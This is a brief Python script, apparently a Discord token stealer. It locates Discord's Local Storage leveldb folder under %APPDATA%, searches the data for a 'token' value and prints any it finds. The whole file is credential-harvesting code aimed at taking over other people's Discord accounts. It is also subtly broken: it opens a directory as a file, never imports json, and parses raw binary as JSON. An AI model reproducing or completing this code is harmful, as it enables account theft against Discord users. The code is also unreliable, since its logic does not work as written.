import win32api

def get_discord_token():
    appdata = win32api.ExpandEnvironmentStrings('%APPDATA%')
    path = appdata + '\\Discord\\Local Storage\\leveldb'
    with open(path, 'rb', buffering=0) as f:
        data = f.read()
        for i, byte in enumerate(data):
            if byte == 0x0a:
                token = json.loads(data[i:].decode()).get('token')
                if token:
                    return token

token = get_discord_token()
if token:
    print(f'Discord token found: {token}')
else:
    print('Discord token not found')
